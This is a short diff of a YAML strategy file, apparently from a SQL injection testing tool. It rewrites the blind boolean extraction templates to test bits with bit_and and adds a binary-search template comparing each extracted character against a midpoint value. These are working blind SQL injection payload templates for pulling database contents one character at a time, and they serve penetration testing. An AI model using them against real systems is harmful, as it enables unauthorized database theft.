@@ -146,14 +146,23 @@ strategy:
  binary:
   test:
    bit: |
-    ascii(
-        substring(
+    0 != bit_and(
+        ascii(substring(
             ${injection},
+            ${window.char},
+            1
+        )),
+        ${bit}
+    )
+   bin: |
+    ascii(
+        substr(
+            (${injection}),
             ${window.char},
             1
         )
     )
-    %26${bit}
+    %3E%3Dascii(chr(${mid.int}))
   modeAnd: and
   modeOr: or
   blind: ${binary.mode} ${test}
